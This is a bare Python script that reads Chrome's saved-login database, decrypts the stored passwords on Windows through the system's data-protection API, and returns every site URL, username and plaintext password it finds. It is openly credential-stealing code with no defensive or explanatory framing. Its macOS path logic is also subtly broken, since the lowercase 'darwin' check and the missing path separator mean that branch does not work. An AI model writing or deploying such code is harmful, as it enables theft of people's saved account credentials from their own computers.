import os
import sqlite3
import platform

try:
    import win32crypt
except:
    pass

def getChromePasswords():
    info_list = []
    path = getPath()

    try:
        connection = sqlite3.connect(path + 'Login Data')
        with connection:
            cursor = connection.cursor()
            v = cursor.execute(
                'SELECT action_url, username_value, password_value FROM logins')
            value = v.fetchall()

        for website_url, username, password in value:
            if os.name == 'nt':
                password = win32crypt.CryptUnprotectData(
                        password, None, None, None, 0)[1]

            if password:
                info_list.append({
                    'website_url': website_url,
                    'username': username,
                    'password': str(password)
                })

        return info_list
    except Exception as e:
        return [{"error": str(e)}]

def getPath():
    path = ''
    if os.name == 'nt':  # Windows
        path = os.getenv('localappdata') + \
               '\\Google\\Chrome\\User Data\\Default\\'
    elif os.name == 'posix':
        path = os.getenv('HOME')
        if platform.system() == 'darwin':  # MacOS
            path += 'Library/Application Support/Google/Chrome/Default'
        else:  # Linux
            path += '/.config/google-chrome/Default/'

    return path